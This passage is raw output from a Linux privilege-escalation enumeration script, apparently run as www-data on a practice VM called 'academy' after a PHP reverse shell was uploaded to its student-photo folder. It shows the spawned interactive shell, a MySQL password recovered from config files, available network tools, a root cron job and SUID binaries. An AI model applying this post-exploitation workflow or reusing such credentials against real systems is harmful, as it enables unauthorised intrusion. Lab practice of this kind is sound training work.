img/var/www/html/academy/assets/js/var/www/html/academy/assets/js/bootstrap.js/var/www/html/academy/assets/js/jquery-1.11.1.js/var/www/html/academy/change-password.php/var/www/html/academy/check_availability.php/var/www/html/academy/db/var/www/html/academy/db/onlinecourse.sql/var/www/html/academy/enroll-history.php/var/www/html/academy/enroll.php/var/www/html/academy/includes/var/www/html/academy/includes/config.php/var/www/html/academy/includes/footer.php/var/www/html/academy/includes/header.php/var/www/html/academy/includes/menubar.php/var/www/html/academy/index.php/var/www/html/academy/logout.php/var/www/html/academy/my-profile.php/var/www/html/academy/pincode-verification.php/var/www/html/academy/print.php/var/www/html/academy/studentphoto/var/www/html/academy/studentphoto/php-rev.php/tmp/linpeas.sh/dev/mqueue/linpeas.txt[+] Searching passwords in config PHP files$mysql_password = "My_V3ryS3cur3_P4ss";                                                                                                                        $mysql_password = "My_V3ryS3cur3_P4ss";[+] Finding IPs inside logs (limit 100)     44 /var/log/dpkg.log.1:1.8.2.1                                                                                                                                 24 /var/log/dpkg.log.1:1.8.2.3     14 /var/log/dpkg.log.1:1.8.4.3      9 /var/log/wtmp:192.168.10.31      7 /var/log/dpkg.log.1:7.43.0.2      7 /var/log/dpkg.log.1:4.8.6.1      7 /var/log/dpkg.log.1:1.7.3.2      7 /var/log/dpkg.log.1:0.5.10.2      7 /var/log/dpkg.log.1:0.19.8.1      4 /var/log/installer/status:1.2.3.3      1 /var/log/lastlog:192.168.10.31[+] Finding passwords inside logs (limit 100)/var/log/dpkg.log.1:2021-05-29 17:00:10 install base-passwd:amd64 <none> 3.5.46                                                                                /var/log/dpkg.log.1:2021-05-29 17:00:10 status half-installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 configure base-passwd:amd64 3.5.46 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 status half-configured base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 status installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 status unpacked base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 status half-configured base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 status half-installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 status unpacked base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 upgrade base-passwd:amd64 3.5.46 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:21 install passwd:amd64 <none> 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:21 status half-installed passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:21 status unpacked passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:24 configure base-passwd:amd64 3.5.46 <none>/var/log/dpkg.log.1:2021-05-29 17:00:24 status half-configured base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:24 status installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:24 status unpacked base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:25 configure passwd:amd64 1:4.5-1.1 <none>/var/log/dpkg.log.1:2021-05-29 17:00:25 status half-configured passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:25 status installed passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:25 status unpacked passwd:amd64 1:4.5-1.1/var/log/installer/status:Description: Set up users and passwords[+] Finding emails inside logs (limit 100)      1 /var/log/installer/status:aeb@debian.org                                                                                                                     1 /var/log/installer/status:anibal@debian.org      2 /var/log/installer/status:berni@debian.org     40 /var/log/installer/status:debian-boot@lists.debian.org     16 /var/log/installer/status:debian-kernel@lists.debian.org      1 /var/log/installer/status:debian-med-packaging@lists.alioth.debian.org      1 /var/log/installer/status:debian@jff.email      1 /var/log/installer/status:djpig@debian.org      4 /var/log/installer/status:gcs@debian.org      2 /var/log/installer/status:guillem@debian.org      1 /var/log/installer/status:guus@debian.org      1 /var/log/installer/status:linux-xfs@vger.kernel.org      2 /var/log/installer/status:mmind@debian.org      1 /var/log/installer/status:open-iscsi@packages.debian.org      1 /var/log/installer/status:open-isns@packages.debian.org      1 /var/log/installer/status:packages@release.debian.org      2 /var/log/installer/status:parted-maintainers@alioth-lists.debian.net      1 /var/log/installer/status:petere@debian.org      2 /var/log/installer/status:pkg-gnupg-maint@lists.alioth.debian.org      1 /var/log/installer/status:pkg-gnutls-maint@lists.alioth.debian.org      1 /var/log/installer/status:pkg-grub-devel@alioth-lists.debian.net      1 /var/log/installer/status:pkg-mdadm-devel@lists.alioth.debian.org      1 /var/log/installer/status:rogershimizu@gmail.com      2 /var/log/installer/status:team+lvm@tracker.debian.org      1 /var/log/installer/status:tytso@mit.edu      1 /var/log/installer/status:wpa@packages.debian.org      1 /var/log/installer/status:xnox@debian.org[+] Finding *password* or *credential* files in home                                                                                                                                                               [+] Finding 'pwd' or 'passw' string inside /home, /var/www, /etc, /root and list possible web(/var/www) and config(/etc) passwords/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2                                                                                             /var/www/html/academy/admin/assets/js/jquery-1.11.1.js/var/www/html/academy/admin/change-password.php/var/www/html/academy/admin/includes/config.php/var/www/html/academy/admin/index.php/var/www/html/academy/admin/manage-students.php/var/www/html/academy/admin/student-registration.php/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2/var/www/html/academy/assets/js/jquery-1.11.1.js/var/www/html/academy/change-password.php/var/www/html/academy/db/onlinecourse.sql/var/www/html/academy/includes/config.php/var/www/html/academy/includes/menubar.php/var/www/html/academy/index.php/var/www/html/academy/pincode-verification.php/var/www/html/academy/admin/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";/var/www/html/academy/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";/etc/apache2/sites-available/default-ssl.conf:          #        Note that no password is obtained from the user. Every entry in the user/etc/apache2/sites-available/default-ssl.conf:          #        file needs this password: `xxj31ZMTZzkVA'./etc/apparmor.d/abstractions/authentication:  # databases containing passwords, PAM configuration files, PAM libraries/etc/debconf.conf:Accept-Type: password/etc/debconf.conf:Filename: /var/cache/debconf/passwords.dat/etc/debconf.conf:Name: passwords/etc/debconf.conf:Reject-Type: password/etc/debconf.conf:Stack: config, passwordsLinux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist LEYEND:                                                                                                                                                         RED/YELLOW: 99% a PE vector  RED: You must take a look at it  LightCyan: Users with console  Blue: Users without console & mounted devs  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)   LightMangenta: Your username====================================( Basic information )=====================================OS: Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)                  User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)Hostname: academyWritable folder: /dev/shm[+] /usr/bin/ping is available for network discovery (You can use linpeas to discover hosts, learn more with -h)[+] /usr/bin/nc is available for network discover & port scanning (You can use linpeas to discover hosts/port scanning, learn more with -h)                                                                                                                                                                                   ====================================( System Information )====================================[+] Operative system                                                                                                                                           [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                                                                Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)                      Distributor ID: DebianDescription:    Debian GNU/Linux 10 (buster)Release:        10Codename:       buster[+] Sudo versionsudo Not Found                                                                                                                                                                                                                                                                                                                [+] PATH[i] Any writable folder in original PATH? (a new completed path will be exported)                                                                              /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                   New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin[+] DateSat Jul 29 06:37:17 EDT 2023                                                                                                                                   [+] System statsFilesystem      Size  Used Avail Use% Mounted on                                                                                                               /dev/sda1       6.9G  1.9G  4.7G  29% /udev            479M     0  479M   0% /devtmpfs           494M     0  494M   0% /dev/shmtmpfs            99M  4.3M   95M   5% /runtmpfs           5.0M     0  5.0M   0% /run/locktmpfs           494M     0  494M   0% /sys/fs/cgrouptmpfs            99M     0   99M   0% /run/user/0              total        used        free      shared  buff/cache   availableMem:        1009960      178916      474532       10816      356512      640884Swap:        998396           0      998396[+] Environment[i] Any private information inside environment variables?                                                                                                      HISTFILESIZE=0                                                                                                                                                 APACHE_RUN_DIR=/var/run/apache2APACHE_PID_FILE=/var/run/apache2/apache2.pidJOURNAL_STREAM=9:13967PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binINVOCATION_ID=d29a7dcbdfb3443ebe10d76ee30417d9APACHE_LOCK_DIR=/var/lock/apache2LANG=CHISTSIZE=0APACHE_RUN_USER=www-dataAPACHE_RUN_GROUP=www-dataAPACHE_LOG_DIR=/var/log/apache2HISTFILE=/dev/null[+] Looking for Signature verification failed in dmseg Not Found                                                                                                                                                                                                                                                                                                                    [+] selinux enabled? .......... sestatus Not Found[+] Printer? .......... lpstat Not Found                                                                                                                       [+] Is this a container? .......... No                                                                                                                         [+] Is ASLR enabled? .......... Yes                                                                                                                            =========================================( Devices )==========================================[+] Any sd* disk in /dev? (limit 20)                                                                                                                           sda                                                                                                                                                            sda1sda2sda5[+] Unmounted file-system?[i] Check if you can mount umounted devices                                                                                                                    UUID=24d0cea7-c37b-4fd6-838e-d05cfb61a601 /               ext4    errors=remount-ro 0       1                                                                  UUID=930c51cc-089d-42bd-8e30-f08b86c52dca none            swap    sw              0       0/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0====================================( Available Software )====================================[+] Useful software?                                                                                                                                           /usr/bin/nc                                                                                                                                                    /usr/bin/netcat/usr/bin/nc.traditional/usr/bin/wget/usr/bin/ping/usr/bin/base64/usr/bin/socat/usr/bin/python/usr/bin/python2/usr/bin/python3/usr/bin/python2.7/usr/bin/python3.7/usr/bin/perl/usr/bin/php[+] Installed compilers?Compilers Not Found                                                                                                                                                                                                                                                                                                           ================================( Processes, Cron & Services )================================[+] Cleaned processes                                                                                                                                          [i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                       USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND                                                                                       root         1  0.0  0.9 103796  9972 ?        Ss   05:18   0:01 /sbin/initroot       324  0.0  0.7  40376  7976 ?        Ss   05:18   0:00 /lib/systemd/systemd-journaldroot       349  0.0  0.4  21932  4952 ?        Ss   05:18   0:00 /lib/systemd/systemd-udevdsystemd+   434  0.0  0.6  93084  6556 ?        Ssl  05:18   0:00 /lib/systemd/systemd-timesyncdroot       465  0.0  0.2   8504  2736 ?        Ss   05:18   0:00 /usr/sbin/cron -froot       470  0.0  0.7  19492  7244 ?        Ss   05:18   0:00 /lib/systemd/systemd-logindmessage+   472  0.0  0.4   8980  4348 ?        Ss   05:18   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-onlyroot       473  0.0  0.4 225824  4332 ?        Ssl  05:18   0:00 /usr/sbin/rsyslogd -n -iNONEroot       475  0.0  0.2   6620  2808 ?        Ss   05:18   0:00 /usr/sbin/vsftpd /etc/vsftpd.confroot       477  0.0  0.3   6924  3376 tty1     Ss   05:18   0:00 /bin/login -p --root       486  0.0  0.6  15852  6876 ?        Ss   05:18   0:00 /usr/sbin/sshd -Droot       521  0.0  2.2 214992 23008 ?        Ss   05:18   0:00 /usr/sbin/apache2 -k startmysql      541  0.0  8.9 1274452 90652 ?       Ssl  05:18   0:03 /usr/sbin/mysqldwww-data   544  0.0  1.2 215348 13032 ?        S    05:18   0:00 /usr/sbin/apache2 -k startroot       634  0.0  0.8  21024  8488 ?        Ss   05:18   0:00 /lib/systemd/systemd --userroot       635  0.0  0.2  22832  2264 ?        S    05:18   0:00 (sd-pam)root       639  0.0  0.4   7652  4444 tty1     S+   05:18   0:00 -bashroot       643  0.0  0.5   9488  5592 ?        Ss   05:18   0:00 dhclientroot      1051  0.0  0.5   9488  5688 ?        Ss   06:07   0:00 dhclientwww-data  1075  0.0  1.2 215340 13024 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1128  0.0  1.6 215340 17168 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1129  0.0  1.9 215460 19852 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1137  0.0  1.9 215460 19540 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1147  0.0  1.9 215460 19652 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1151  0.0  2.3 218640 23700 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1157  0.0  1.2 215348 12772 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1163  0.0  1.2 215340 12756 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1172  0.0  1.9 215576 19836 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1583  0.0  0.0   2388   756 ?        S    06:33   0:00 sh -c uname -a; w; id; /bin/sh -iwww-data  1587  0.0  0.0   2388   752 ?        S    06:33   0:00 /bin/sh -iwww-data  1624  1.0  0.1   2520  1628 ?        S    06:37   0:00 /bin/sh ./linpeas.shwww-data  1805  0.0  0.2   7640  2728 ?        R    06:37   0:00 ps aux[+] Binary processes permissions[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                       56K -rwxr-xr-x 1 root root  56K Jul 27  2018 /bin/login                                                                                                          0 lrwxrwxrwx 1 root root    4 May 29  2021 /bin/sh -> dash1.5M -rwxr-xr-x 1 root root 1.5M Mar 18  2021 /lib/systemd/systemd144K -rwxr-xr-x 1 root root 143K Mar 18  2021 /lib/systemd/systemd-journald228K -rwxr-xr-x 1 root root 227K Mar 18  2021 /lib/systemd/systemd-logind 56K -rwxr-xr-x 1 root root  55K Mar 18  2021 /lib/systemd/systemd-timesyncd664K -rwxr-xr-x 1 root root 663K Mar 18  2021 /lib/systemd/systemd-udevd   0 lrwxrwxrwx 1 root root   20 Mar 18  2021 /sbin/init -> /lib/systemd/systemd236K -rwxr-xr-x 1 root root 236K Jul  5  2020 /usr/bin/dbus-daemon672K -rwxr-xr-x 1 root root 672K Aug 25  2020 /usr/sbin/apache2 56K -rwxr-xr-x 1 root root  55K Oct 11  2019 /usr/sbin/cron 20M -rwxr-xr-x 1 root root  20M Nov 25  2020 /usr/sbin/mysqld688K -rwxr-xr-x 1 root root 686K Feb 26  2019 /usr/sbin/rsyslogd792K -rwxr-xr-x 1 root root 789K Jan 31  2020 /usr/sbin/sshd164K -rwxr-xr-x 1 root root 161K Mar  6  2019 /usr/sbin/vsftpd[+] Cron jobs[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs                                                                                 -rw-r--r-- 1 root root 1077 Jun 16  2021 /etc/crontab                                                                                                          /etc/cron.d:total 16drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder-rw-r--r--  1 root root  712 Dec 17  2018 php/etc/cron.daily:total 40drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder-rwxr-xr-x  1 root root  539 Aug  8  2020 apache2-rwxr-xr-x  1 root root 1478 May 12  2020 apt-compat-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils-rwxr-xr-x  1 root root 1187 Apr 18  2019 dpkg-rwxr-xr-x  1 root root  377 Aug 28  2018 logrotate-rwxr-xr-x  1 root root 1123 Feb 10  2019 man-db-rwxr-xr-x  1 root root  249 Sep 27  2017 passwd/etc/cron.hourly:total 12drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder/etc/cron.monthly:total 12drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder/etc/cron.weekly:total 16drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder-rwxr-xr-x  1 root root  813 Feb 10  2019 man-dbSHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin* * * * * /home/grimmie/backup.sh[+] Services[i] Search for outdated versions                                                                                                                                [ - ]  apache-htcacheclean                                                                                                                                     [ + ]  apache2 [ + ]  apparmor [ - ]  console-setup.sh [ + ]  cron [ + ]  dbus [ - ]  hwclock.sh [ - ]  keyboard-setup.sh [ + ]  kmod [ + ]  mysql [ + ]  networking [ + ]  procps [ - ]  rsync [ + ]  rsyslog [ + ]  ssh [ + ]  udev [ + ]  vsftpd===================================( Network Information )====================================[+] Hostname, hosts and DNS                                                                                                                                    academy                                                                                                                                                        127.0.0.1       localhost127.0.1.1       academy.tcm.sec academy::1     localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allroutersdomain localdomainsearch localdomainnameserver 172.16.2.2tcm.sec[+] Content of /etc/inetd.conf/etc/inetd.conf Not Found                                                                                                                                                                                                                                                                                                     [+] Networks and neighboursdefault         0.0.0.0                                                                                                                                        loopback        127.0.0.0link-local      169.254.0.01: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo       valid_lft forever preferred_lft forever    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000    link/ether 00:0c:29:a6:6e:61 brd ff:ff:ff:ff:ff:ff    inet 172.16.2.129/24 brd 172.16.2.255 scope global dynamic ens33       valid_lft 1638sec preferred_lft 1638sec    inet6 fe80::20c:29ff:fea6:6e61/64 scope link        valid_lft forever preferred_lft forever172.16.2.254 dev ens33 lladdr 00:50:56:ed:99:be STALE172.16.2.2 dev ens33 lladdr 00:50:56:fc:a4:5b REACHABLE172.16.2.1 dev ens33 lladdr 00:50:56:c0:00:08 REACHABLE[+] Iptables rulesiptables rules Not Found                                                                                                                                                                                                                                                                                                      [+] Active Ports[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports                                                                                                                                                                                                                                           [+] Can I sniff with tcpdump?No                                                                                                                                                                                                                                                                                                                            ====================================( Users Information )=====================================[+] My user                                                                                                                                                    [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups                                                                                         uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                          [+] Do I have PGP keys?gpg Not Found                                                                                                                                                                                                                                                                                                                 [+] Clipboard or highlighted text?xsel and xclip Not Found                                                                                                                                                                                                                                                                                                      [+] Testing 'sudo -l' without password & /etc/sudoers[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                                                                                                                                                                                          [+] Checking /etc/doas.conf/etc/doas.conf Not Found                                                                                                                                                                                                                                                                                                      [+] Checking Pkexec policy                                                                                                                                                               [+] Don forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!                                                                                                                                                                                                                             [+] Superusersroot:x:0:0:root:/root:/bin/bash                                                                                                                                [+] Users with consolegrimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash                                                                                                   root:x:0:0:root:/root:/bin/bash[+] Login information 06:37:18 up  1:19,  1 user,  load average: 0.24, 0.06, 0.41                                                                                                   USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATroot     tty1     -                10:18   29:42   0.04s  0.01s -bashroot     tty1                          Sat May 29 13:31 - down   (00:12)reboot   system boot  4.19.0-16-amd64  Sat May 29 13:30 - 13:43  (00:13)root     pts/0        192.168.10.31    Sat May 29 13:16 - 13:27  (00:11)root     tty1                          Sat May 29 13:16 - down   (00:11)reboot   system boot  4.19.0-16-amd64  Sat May 29 13:15 - 13:27  (00:12)root     pts/0        192.168.10.31    Sat May 29 13:08 - 13:14  (00:06)administ tty1                          Sat May 29 13:06 - down   (00:08)reboot   system boot  4.19.0-16-amd64  Sat May 29 13:05 - 13:14  (00:08)wtmp begins Sat May 29 13:05:58 2021[+] All users_apt                                                                                                                                                           backupbindaemonftpgamesgnatsgrimmieirclistlpmailmanmessagebusmysqlnewsnobodyproxyrootsshdsyncsyssystemd-coredumpsystemd-networksystemd-resolvesystemd-timesyncuucpwww-data[+] Password policyPASS_MAX_DAYS   99999                                                                                                                                          PASS_MIN_DAYS   0PASS_WARN_AGE   7ENCRYPT_METHOD SHA512===================================( Software Information )===================================[+] MySQL version                                                                                                                                              mysql  Ver 15.1 Distrib 10.3.27-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2                                                                      [+] MySQL connection using default root/root ........... No[+] MySQL connection using root/toor ................... No                                                                                                    [+] MySQL connection using root/NOPASS ................. No                                                                                                    [+] Looking for mysql credentials and exec                                                                                                                     From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user                    = mysql                                                                     Found readable /etc/mysql/my.cnf[client-server]!includedir /etc/mysql/conf.d/!includedir /etc/mysql/mariadb.conf.d/[+] PostgreSQL version and pgadmin credentials Not Found                                                                                                                                                                                                                                                                                                                    [+] PostgreSQL connection to template0 using postgres/NOPASS ........ No[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No                                                                                       [+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No                                                                                       [+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No                                                                                                                                                                                                                                                      [+] Apache server infoVersion: Server version: Apache/2.4.38 (Debian)                                                                                                                Server built:   2020-08-25T20:08:29[+] Looking for PHPCookies Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for Wordpress wp-config.php fileswp-config.php Not Found                                                                                                                                                                                                                                                                                                       [+] Looking for Tomcat users filetomcat-users.xml Not Found                                                                                                                                                                                                                                                                                                    [+] Mongo information Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for supervisord configuration filesupervisord.conf Not Found                                                                                                                                                                                                                                                                                                    [+] Looking for cesi configuration filecesi.conf Not Found                                                                                                                                                                                                                                                                                                           [+] Looking for Rsyncd config file/usr/share/doc/rsync/examples/rsyncd.conf                                                                                                                      [ftp]        comment = public archive        path = /var/www/pub        use chroot = yes        lock file = /var/lock/rsyncd        read only = yes        list = yes        uid = nobody        gid = nogroup        strict modes = yes        ignore errors = no        ignore nonreadable = yes        transfer logging = no        timeout = 600        refuse options = checksum dry-run        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz[+] Looking for Hostapd config filehostapd.conf Not Found                                                                                                                                                                                                                                                                                                        [+] Looking for wifi conns file Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for Anaconda-ks config filesanaconda-ks.cfg Not Found                                                                                                                                                                                                                                                                                                     [+] Looking for .vnc directories and their passwd files.vnc Not Found                                                                                                                                                                                                                                                                                                                [+] Looking for ldap directories and their hashes/etc/ldap                                                                                                                                                      The password hash is from the {SSHA} to 'structural'[+] Looking for .ovpn files and credentials.ovpn Not Found                                                                                                                                                                                                                                                                                                               [+] Looking for ssl/ssh filesPermitRootLogin yes                                                                                                                                            ChallengeResponseAuthentication noUsePAM yesLooking inside /etc/ssh/ssh_config for interesting infoHost *    SendEnv LANG LC_*    HashKnownHosts yes    GSSAPIAuthentication yes[+] Looking for unexpected auth lines in /etc/pam.d/sshdNo                                                                                                                                                                                                                                                                                                                            [+] Looking for Cloud credentials (AWS, Azure, GC)                                                                                                                                                               [+] NFS exports?[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe                                                         /etc/exports Not Found                                                                                                                                                                                                                                                                                                        [+] Looking for kerberos conf files and tickets[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt                                                                          krb5.conf Not Found                                                                                                                                            tickets kerberos Not Found                                                                                                                                     klist Not Found                                                                                                                                                                                                                                                                                                               [+] Looking for Kibana yamlkibana.yml Not Found                                                                                                                                                                                                                                                                                                          [+] Looking for logstash files Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for elasticsearch files Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for Vault-ssh filesvault-ssh-helper.hcl Not Found                                                                                                                                                                                                                                                                                                [+] Looking for AD cached hahsescached hashes Not Found                                                                                                                                                                                                                                                                                                       [+] Looking for screen sessions[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                            screen Not Found                                                                                                                                                                                                                                                                                                              [+] Looking for tmux sessions[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                            tmux Not Found                                                                                                                                                                                                                                                                                                                [+] Looking for Couchdb directory                                                                                                                                                               [+] Looking for redis.conf                                                                                                                                                               [+] Looking for dovecot filesdovecot credentials Not Found                                                                                                                                                                                                                                                                                                 [+] Looking for mosquitto.conf                                                                                                                                                               ====================================( Interesting Files )=====================================[+] SUID                                                                                                                                                       [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                    /usr/lib/eject/dmcrypt-get-device/usr/lib/openssh/ssh-keysign/usr/bin/chfn           --->    SuSE_9.3/10/usr/bin/mount          --->    Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8/usr/bin/newgrp         --->    HP-UX_10.20/usr/bin/umount         --->    BSD/Linux[1996-08-13]/usr/bin/chsh/usr/bin/passwd         --->    Apple_Mac_OSX/Solaris/SPARC_8/9/Sun_Solaris_2.5.1_PAM/usr/bin/su/usr/bin/gpasswd[+] SGID[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           /usr/sbin/unix_chkpwd                                                                                                                                          /usr/bin/bsd-write/usr/bin/expiry/usr/bin/wall/usr/bin/crontab/usr/bin/dotlockfile/usr/bin/chage/usr/bin/ssh-agent[+] Capabilities[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                                   /usr/bin/ping = cap_net_raw+ep                                                                                                                                 [+] .sh files in path/usr/bin/gettext.sh                                                                                                                                            [+] Files (scripts) in /etc/profile.d/total 20                                                                                                                                                       drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  664 Mar  1  2019 bash_completion.sh-rw-r--r--  1 root root 1107 Sep 14  2018 gawk.csh-rw-r--r--  1 root root  757 Sep 14  2018 gawk.sh[+] Hashes inside passwd file? ........... No[+] Can I read shadow files? ........... No                                                                                                                    [+] Can I read root folder? ........... No                                                                                                                                                                                                                                                                                    [+] Looking for root files in home dirs (limit 20)/home                                                                                                                                                          [+] Looking for root files in folders owned by me                                                                                                                                                               [+] Readable files belonging to root and readable by me but not world readable                                                                                                                                                               [+] Files inside /home/www-data (limit 20)                                                                                                                                                               [+] Files inside others home (limit 20)/home/grimmie/.bash_history                                                                                                                                    /home/grimmie/.bashrc/home/grimmie/backup.sh/home/grimmie/.profile/home/grimmie/.bash_logout[+] Looking for installed mail applications                                                                                                                                                               [+] Mails (limit 50)                                                                                                                                                               [+] Backup files?-rwxr-xr-- 1 grimmie administrator 112 May 30  2021 /home/grimmie/backup.sh                                                                                    -rwxr-xr-x 1 root root 38412 Nov 25  2020 /usr/bin/wsrep_sst_mariabackup[+] Looking for tables inside readable .db/.sqlite files (limit 100)                                                                                                                                                               [+] Web files?(output limit)/var/www/:                                                                                                                                                     total 12Kdrwxr-xr-x  3 root root 4.0K May 29  2021 .drwxr-xr-x 12 root root 4.0K May 29  2021 ..drwxr-xr-x  3 root root 4.0K May 29  2021 html/var/www/html:total 24Kdrwxr-xr-x 3 root     root     4.0K May 29  2021 .drwxr-xr-x 3 root     root     4.0K May 29  2021 ..[+] *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .gitconfig, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml                                                                                                                                                   [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data                                                                            -rw-r--r-- 1 root root 1994 Apr 18  2019 /etc/bash.bashrc                                                                                                      -rw-r--r-- 1 root root 3526 Apr 18  2019 /etc/skel/.bashrc-rw-r--r-- 1 root root 807 Apr 18  2019 /etc/skel/.profile-rw-r--r-- 1 grimmie administrator 3526 May 29  2021 /home/grimmie/.bashrc-rw-r--r-- 1 grimmie administrator 807 May 29  2021 /home/grimmie/.profile-rw-r--r-- 1 root root 2778 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc-rw-r--r-- 1 root root 802 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc-rw-r--r-- 1 root root 570 Jan 31  2010 /usr/share/base-files/dot.bashrc[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)   139266      4 -rw-r--r--   1 grimmie  administrator      220 May 29  2021 /home/grimmie/.bash_logout                                                           270249      4 -rw-r--r--   1 root     root 